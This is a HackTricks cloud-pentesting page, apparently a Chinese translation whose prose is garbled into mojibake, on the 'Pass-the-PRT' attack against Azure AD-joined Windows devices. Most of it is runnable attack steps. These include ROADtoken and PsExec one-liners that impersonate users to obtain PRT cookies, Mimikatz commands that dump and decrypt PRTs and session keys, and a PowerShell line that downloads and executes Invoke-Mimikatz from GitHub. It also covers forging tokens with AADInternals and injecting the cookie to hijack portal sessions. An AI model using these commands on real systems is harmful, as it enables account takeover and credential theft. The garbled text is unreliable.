# Az - Pass the PRT

{% hint style="success" %}
å­¦ä¹ å’Œç»ƒä¹  AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œç»ƒä¹  GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡æäº¤ PRs åˆ†äº«é»‘å®¢æŠ€å·§åˆ°** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“ã€‚

</details>
{% endhint %}

## ä»€ä¹ˆæ˜¯ PRT

{% content-ref url="az-primary-refresh-token-prt.md" %}
[az-primary-refresh-token-prt.md](az-primary-refresh-token-prt.md)
{% endcontent-ref %}

### æ£€æŸ¥ä½ æ˜¯å¦æœ‰ PRT
```
Dsregcmd.exe /status
```
åœ¨SSO Stateéƒ¨åˆ†ï¼Œä½ åº”è¯¥çœ‹åˆ°**`AzureAdPrt`**è®¾ç½®ä¸º**YES**ã€‚

<figure><img src="../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

åœ¨åŒä¸€è¾“å‡ºä¸­ï¼Œä½ è¿˜å¯ä»¥çœ‹åˆ°**è®¾å¤‡æ˜¯å¦åŠ å…¥Azure**ï¼ˆåœ¨å­—æ®µ`AzureAdJoined`ä¸­ï¼‰ï¼š

<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

## PRT Cookie

PRT cookieå®é™…ä¸Šè¢«ç§°ä¸º**`x-ms-RefreshTokenCredential`**ï¼Œå®ƒæ˜¯ä¸€ä¸ªJSON Web Token (JWT)ã€‚ä¸€ä¸ªJWTåŒ…å«**3éƒ¨åˆ†**ï¼Œå³**header**ã€**payload**å’Œ**signature**ï¼Œç”±ä¸€ä¸ª`.`åˆ†éš”ï¼Œå¹¶ä¸”å…¨éƒ¨æ˜¯url-safe base64ç¼–ç çš„ã€‚ä¸€ä¸ªå…¸å‹çš„PRT cookieåŒ…å«ä»¥ä¸‹headerå’Œbodyï¼š
```json
{
"alg": "HS256",
"ctx": "oYKjPJyCZN92Vtigt/f8YlVYCLoMu383"
}
{
"refresh_token": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAZ18nQkT-eD6Hqt7sf5QY0iWPSssZOto]<cut>VhcDew7XCHAVmCutIod8bae4YFj8o2OOEl6JX-HIC9ofOG-1IOyJegQBPce1WS-ckcO1gIOpKy-m-JY8VN8xY93kmj8GBKiT8IAA",
"is_primary": "true",
"request_nonce": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAPrlbf_TrEVJRMW2Cr7cJvYKDh2XsByis2eCF9iBHNqJJVzYR_boX8VfBpZpeIV078IE4QY0pIBtCcr90eyah5yAA"
}
```
å®é™…çš„**Primary Refresh Token (PRT)**å°è£…åœ¨**`refresh_token`**ä¸­ï¼Œè¯¥ä»¤ç‰Œç”±Azure ADæ§åˆ¶çš„å¯†é’¥åŠ å¯†ï¼Œä½¿å…¶å†…å®¹å¯¹æˆ‘ä»¬æ¥è¯´æ˜¯ä¸é€æ˜ä¸”æ— æ³•è§£å¯†çš„ã€‚å­—æ®µ**`is_primary`**è¡¨ç¤ºä¸»åˆ·æ–°ä»¤ç‰Œå°è£…åœ¨æ­¤ä»¤ç‰Œä¸­ã€‚ä¸ºäº†ç¡®ä¿cookieç»‘å®šåˆ°å…¶é¢„æœŸçš„ç‰¹å®šç™»å½•ä¼šè¯ï¼Œ`request_nonce`ä»`logon.microsoftonline.com`é¡µé¢ä¼ è¾“ã€‚

### ä½¿ç”¨TPMçš„PRT Cookieæµç¨‹

**LSASS**è¿›ç¨‹å°†**KDF context**å‘é€åˆ°TPMï¼ŒTPMå°†ä½¿ç”¨**session key**ï¼ˆåœ¨è®¾å¤‡æ³¨å†Œåˆ°AzureADæ—¶æ”¶é›†å¹¶å­˜å‚¨åœ¨TPMä¸­ï¼‰å’Œå…ˆå‰çš„ä¸Šä¸‹æ–‡æ¥**æ´¾ç”Ÿ**ä¸€ä¸ª**å¯†é’¥**ï¼Œå¹¶ä½¿ç”¨è¿™ä¸ª**æ´¾ç”Ÿå¯†é’¥**æ¥**ç­¾ç½²PRT cookie (JWT)**ã€‚

**KDF context**æ˜¯æ¥è‡ªAzureADçš„ä¸€ä¸ªnonceå’ŒPRTï¼Œåˆ›å»ºä¸€ä¸ªä¸**context**ï¼ˆéšæœºå­—èŠ‚ï¼‰æ··åˆçš„**JWT**ã€‚

å› æ­¤ï¼Œå³ä½¿PRTæ— æ³•æå–ï¼Œå› ä¸ºå®ƒä½äºTPMå†…éƒ¨ï¼Œä¹Ÿå¯ä»¥æ»¥ç”¨LSASSæ¥**ä»æ–°ä¸Šä¸‹æ–‡è¯·æ±‚æ´¾ç”Ÿå¯†é’¥å¹¶ä½¿ç”¨ç”Ÿæˆçš„å¯†é’¥ç­¾ç½²Cookies**ã€‚

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

## PRTæ»¥ç”¨åœºæ™¯

ä½œä¸º**æ™®é€šç”¨æˆ·**ï¼Œå¯ä»¥é€šè¿‡å‘LSASSè¯·æ±‚SSOæ•°æ®æ¥**è¯·æ±‚PRTä½¿ç”¨**ã€‚\
è¿™å¯ä»¥åƒ**æœ¬æœºåº”ç”¨ç¨‹åº**ä¸€æ ·ï¼Œé€šè¿‡**Web Account Manager**ï¼ˆä»¤ç‰Œä»£ç†ï¼‰è¯·æ±‚ä»¤ç‰Œã€‚WAMå°†è¯·æ±‚ä¼ é€’ç»™**LSASS**ï¼Œåè€…ä½¿ç”¨ç­¾åçš„PRTæ–­è¨€è¯·æ±‚ä»¤ç‰Œã€‚æˆ–è€…å¯ä»¥é€šè¿‡**åŸºäºæµè§ˆå™¨çš„ï¼ˆwebï¼‰æµç¨‹**ï¼Œå…¶ä¸­**PRT cookie**ç”¨ä½œ**header**æ¥éªŒè¯å¯¹Azure ASç™»å½•é¡µé¢çš„è¯·æ±‚ã€‚

ä½œä¸º**SYSTEM**ï¼Œå¦‚æœPRTæœªå—TPMä¿æŠ¤ï¼Œå¯ä»¥**çªƒå–PRT**æˆ–ä½¿ç”¨åŠ å¯†API**ä¸LSASSä¸­çš„PRTå¯†é’¥äº¤äº’**ã€‚

## Pass-the-PRTæ”»å‡»ç¤ºä¾‹

### æ”»å‡» - ROADtoken

æœ‰å…³æ­¤æ–¹æ³•çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…[**è¿™ç¯‡æ–‡ç« **](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)ã€‚ROADtokenå°†ä»æ­£ç¡®çš„ç›®å½•è¿è¡Œ**`BrowserCore.exe`**å¹¶ä½¿ç”¨å®ƒæ¥**è·å–PRT cookie**ã€‚ç„¶åå¯ä»¥ä½¿ç”¨æ­¤cookieä¸ROADtoolsè¿›è¡Œèº«ä»½éªŒè¯å¹¶**è·å–æŒä¹…åˆ·æ–°ä»¤ç‰Œ**ã€‚

è¦ç”Ÿæˆæœ‰æ•ˆçš„PRT cookieï¼Œé¦–å…ˆéœ€è¦ä¸€ä¸ªnonceã€‚\
ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è·å–ï¼š
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
æˆ–è€…ä½¿ç”¨ [**roadrecon**](https://github.com/dirkjanm/ROADtools):
```powershell
roadrecon auth prt-init
```
ç„¶åä½ å¯ä»¥ä½¿ç”¨ [**roadtoken**](https://github.com/dirkjanm/ROADtoken) è·å–ä¸€ä¸ªæ–°çš„ PRTï¼ˆåœ¨å·¥å…·ä¸­ä»è¦æ”»å‡»çš„ç”¨æˆ·è¿›ç¨‹è¿è¡Œï¼‰ï¼š
```powershell
.\ROADtoken.exe <nonce>
```
ä½œä¸ºå•è¡Œå‘½ä»¤ï¼š

{% code overflow="wrap" %}
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
{% endcode %}

ç„¶åä½ å¯ä»¥ä½¿ç”¨**ç”Ÿæˆçš„cookie**æ¥**ç”Ÿæˆä»¤ç‰Œ**ï¼Œä»¥ä½¿ç”¨Azure AD **Graph**æˆ–Microsoft Graphè¿›è¡Œ**ç™»å½•**ï¼š
```powershell
# Generate
roadrecon auth --prt-cookie <prt_cookie>

# Connect
Connect-AzureAD --AadAccessToken <token> --AccountId <acc_ind>
```
### Attack - Using roadrecon

### Attack - Using AADInternals and a leaked PRT

`Get-AADIntUserPRTToken` **ä»Azure ADåŠ å…¥æˆ–æ··åˆåŠ å…¥çš„è®¡ç®—æœºè·å–ç”¨æˆ·çš„PRT token**ã€‚ä½¿ç”¨`BrowserCore.exe`è·å–PRT tokenã€‚
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
æˆ–è€…ï¼Œå¦‚æœä½ æœ‰æ¥è‡ª Mimikatz çš„å€¼ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ AADInternals æ¥ç”Ÿæˆä¸€ä¸ª token:
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
å‰å¾€ [https://login.microsoftonline.com](https://login.microsoftonline.com)ï¼Œæ¸…é™¤æ‰€æœ‰ login.microsoftonline.com çš„ cookies å¹¶è¾“å…¥ä¸€ä¸ªæ–°çš„ cookieã€‚
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
ç„¶åè®¿é—® [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
å…¶ä½™éƒ¨åˆ†åº”ä¸ºé»˜è®¤è®¾ç½®ã€‚ç¡®ä¿æ‚¨å¯ä»¥åˆ·æ–°é¡µé¢å¹¶ä¸”cookieä¸ä¼šæ¶ˆå¤±ï¼Œå¦‚æœæ¶ˆå¤±äº†ï¼Œæ‚¨å¯èƒ½çŠ¯äº†é”™è¯¯ï¼Œéœ€è¦é‡æ–°è¿›è¡Œè¯¥è¿‡ç¨‹ã€‚å¦‚æœæ²¡æœ‰æ¶ˆå¤±ï¼Œæ‚¨åº”è¯¥æ²¡é—®é¢˜ã€‚
{% endhint %}

### æ”»å‡» - Mimikatz

#### æ­¥éª¤

1. **PRT (Primary Refresh Token) ä» LSASS** (Local Security Authority Subsystem Service) ä¸­æå–å¹¶å­˜å‚¨ä»¥ä¾›åç»­ä½¿ç”¨ã€‚
2. **æ¥ä¸‹æ¥æå– Session Key**ã€‚ç”±äºè¯¥å¯†é’¥æœ€åˆç”±æœ¬åœ°è®¾å¤‡å‘å‡ºå¹¶é‡æ–°åŠ å¯†ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨DPAPIä¸»å¯†é’¥è¿›è¡Œè§£å¯†ã€‚æœ‰å…³DPAPI (Data Protection API) çš„è¯¦ç»†ä¿¡æ¯å¯ä»¥åœ¨è¿™äº›èµ„æºä¸­æ‰¾åˆ°ï¼š[HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords)ï¼Œè¦äº†è§£å…¶åº”ç”¨ï¼Œè¯·å‚é˜… [Pass-the-cookie attack](az-pass-the-cookie.md)ã€‚
3. è§£å¯†Session Keyåï¼Œ**è·å¾—PRTçš„æ´¾ç”Ÿå¯†é’¥å’Œä¸Šä¸‹æ–‡**ã€‚è¿™äº›å¯¹äº**åˆ›å»ºPRT cookie**è‡³å…³é‡è¦ã€‚å…·ä½“æ¥è¯´ï¼Œæ´¾ç”Ÿå¯†é’¥ç”¨äºç­¾ç½²æ„æˆcookieçš„JWT (JSON Web Token)ã€‚Dirk-janæä¾›äº†è¿™ä¸€è¿‡ç¨‹çš„è¯¦ç»†è§£é‡Šï¼Œå¯ä»¥åœ¨[è¿™é‡Œ](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)è®¿é—®ã€‚

{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œå¦‚æœPRTåœ¨TPMä¸­è€Œä¸æ˜¯åœ¨`lsass`ä¸­ï¼Œ**mimikatzå°†æ— æ³•æå–å®ƒ**ã€‚\
ä½†æ˜¯ï¼Œå¯ä»¥ä»TPMçš„ä¸Šä¸‹æ–‡ä¸­**è·å–æ´¾ç”Ÿå¯†é’¥å¹¶ä½¿ç”¨å®ƒæ¥**ç­¾ç½²cookieï¼ˆæŸ¥çœ‹é€‰é¡¹3ï¼‰ã€‚
{% endhint %}

æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°**æ‰§è¡Œè¿‡ç¨‹çš„è¯¦ç»†è§£é‡Š**ä»¥æå–è¿™äº›è¯¦ç»†ä¿¡æ¯ï¼š[**https://dirkjanm.io/digging-further-into-the-primary-refresh-token/**](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)

{% hint style="warning" %}
è¿™åœ¨2021å¹´8æœˆä¿®å¤åå°†æ— æ³•å‡†ç¡®åœ°è·å–å…¶ä»–ç”¨æˆ·çš„PRTä»¤ç‰Œï¼Œå› ä¸ºåªæœ‰ç”¨æˆ·è‡ªå·±å¯ä»¥è·å–ä»–çš„PRTï¼ˆæœ¬åœ°ç®¡ç†å‘˜æ— æ³•è®¿é—®å…¶ä»–ç”¨æˆ·çš„PRTï¼‰ï¼Œä½†å¯ä»¥è®¿é—®ä»–è‡ªå·±çš„ã€‚
{% endhint %}

æ‚¨å¯ä»¥ä½¿ç”¨**mimikatz**æå–PRTï¼š
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
(Images from https://blog.netwrix.com/2023/05/13/pass-the-prt-overview)

<figure><img src="../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

**å¤åˆ¶**æ ‡è®°ä¸º**Prt**çš„éƒ¨åˆ†å¹¶ä¿å­˜ã€‚\
è¿˜è¦æå–ä¼šè¯å¯†é’¥ï¼ˆ**`ProofOfPossesionKey`**å­—æ®µçš„**`KeyValue`**ï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚è¿™æ˜¯åŠ å¯†çš„ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨DPAPIä¸»å¯†é’¥æ¥è§£å¯†å®ƒã€‚

<figure><img src="../../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
å¦‚æœä½ æ²¡æœ‰çœ‹åˆ°ä»»ä½•PRTæ•°æ®ï¼Œå¯èƒ½æ˜¯å› ä¸ºä½ çš„è®¾å¤‡**æ²¡æœ‰åŠ å…¥Azure AD**ï¼Œæˆ–è€…ä½ è¿è¡Œçš„æ˜¯**æ—§ç‰ˆæœ¬**çš„Windows 10ã€‚
{% endhint %}

è¦**è§£å¯†**ä¼šè¯å¯†é’¥ï¼Œä½ éœ€è¦**æå‡**ä½ çš„æƒé™åˆ°**SYSTEM**ï¼Œä»¥ä¾¿åœ¨è®¡ç®—æœºä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œæ‰èƒ½ä½¿ç”¨**DPAPIä¸»å¯†é’¥æ¥è§£å¯†å®ƒ**ã€‚ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å®ç°ï¼š
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
<figure><img src="../../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

#### é€‰é¡¹ 1 - å®Œæ•´ Mimikatz

* ç°åœ¨ä½ éœ€è¦å¤åˆ¶ Context å€¼ï¼š

<figure><img src="../../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

* ä»¥åŠæ´¾ç”Ÿå¯†é’¥å€¼ï¼š

<figure><img src="../../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

* æœ€åï¼Œä½ å¯ä»¥ä½¿ç”¨æ‰€æœ‰è¿™äº›ä¿¡æ¯æ¥**ç”Ÿæˆ PRT cookies**ï¼š
```bash
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

* è®¿é—® [https://login.microsoftonline.com](https://login.microsoftonline.com)ï¼Œæ¸…é™¤æ‰€æœ‰ login.microsoftonline.com çš„ cookies å¹¶è¾“å…¥ä¸€ä¸ªæ–°çš„ cookieã€‚
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
* ç„¶åè®¿é—® [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
å…¶ä½™çš„åº”è¯¥æ˜¯é»˜è®¤è®¾ç½®ã€‚ç¡®ä¿ä½ å¯ä»¥åˆ·æ–°é¡µé¢å¹¶ä¸”cookieä¸ä¼šæ¶ˆå¤±ï¼Œå¦‚æœæ¶ˆå¤±äº†ï¼Œå¯èƒ½æ˜¯ä½ çŠ¯äº†é”™è¯¯ï¼Œéœ€è¦é‡æ–°è¿›è¡Œè¿™ä¸ªè¿‡ç¨‹ã€‚å¦‚æœæ²¡æœ‰æ¶ˆå¤±ï¼Œé‚£ä½ åº”è¯¥å°±æ²¡é—®é¢˜äº†ã€‚
{% endhint %}

#### é€‰é¡¹ 2 - ä½¿ç”¨ PRT çš„ roadrecon

* é¦–å…ˆæ›´æ–° PRTï¼Œè¿™ä¼šå°†å…¶ä¿å­˜åœ¨ `roadtx.prt` ä¸­ï¼š

{% code overflow="wrap" %}
```bash
roadtx prt -a renew --prt <PRT From mimikatz> --prt-sessionkey <clear key from mimikatz>
```
{% endcode %}

* ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ `roadtx browserprtauth` é€šè¿‡äº¤äº’å¼æµè§ˆå™¨**è¯·æ±‚ä»¤ç‰Œ**ã€‚å¦‚æœæˆ‘ä»¬ä½¿ç”¨ `roadtx describe` å‘½ä»¤ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°è®¿é—®ä»¤ç‰ŒåŒ…å«ä¸€ä¸ª MFA å£°æ˜ï¼Œå› ä¸ºæˆ‘åœ¨è¿™ç§æƒ…å†µä¸‹ä½¿ç”¨çš„ PRT ä¹Ÿæœ‰ä¸€ä¸ª MFA å£°æ˜ã€‚
```bash
roadtx browserprtauth
roadtx describe < .roadtools_auth
```
<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

#### é€‰é¡¹ 3 - ä½¿ç”¨ derived keys çš„ roadrecon

æœ‰äº† mimikatz å¯¼å‡ºçš„ä¸Šä¸‹æ–‡å’Œ derived keyï¼Œå¯ä»¥ä½¿ç”¨ roadrecon ç”Ÿæˆä¸€ä¸ªæ–°çš„ç­¾å cookieï¼š

{% code overflow="wrap" %}
```bash
roadrecon auth --prt-cookie <cookie> --prt-context <context> --derives-key <derived key>
```
{% endcode %}

## å‚è€ƒèµ„æ–™

* [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)
* [https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
* [https://www.youtube.com/watch?v=x609c-MUZ\_g](https://www.youtube.com/watch?v=x609c-MUZ\_g)

{% hint style="success" %}
å­¦ä¹ å’Œç»ƒä¹  AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œç»ƒä¹  GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡æäº¤ PRs åˆ†äº« hacking æŠ€å·§åˆ°** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“ã€‚

</details>
{% endhint %}
